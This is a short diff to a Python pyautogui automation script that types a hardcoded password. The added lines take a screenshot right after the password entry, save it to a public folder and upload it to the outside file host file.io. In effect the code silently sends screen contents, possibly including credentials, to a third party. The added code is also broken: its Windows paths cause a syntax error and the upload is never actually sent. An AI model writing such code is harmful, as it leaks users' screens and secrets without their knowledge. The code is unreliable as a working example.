@@ -1,6 +1,7 @@
 import pyautogui as pag
 import time
 import pyperclip
+import requests
 
 
 # Define the coordinates and use the `actions` list
@@ -41,6 +42,12 @@ for x, y, duration in actions:
         text_to_type = "Pakistan@9"
         pag.typewrite(text_to_type)
 
+time.sleep(2)
+im1 = pag.screenshot()
+im2 = pag.screenshot('C:\Users\Public\Desktop\my_screenshot.png')
+files = {'file': open('C:\Users\Public\Desktop\my_screenshot.png', 'rb')}
+r = requests.Request('POST', 'https://file.io', files=files).prepare().body.decode('ascii')
+print(r.content)
 
 def save_echo_to_batch(file_path, echo_text):
     with open(file_path, 'a') as file:
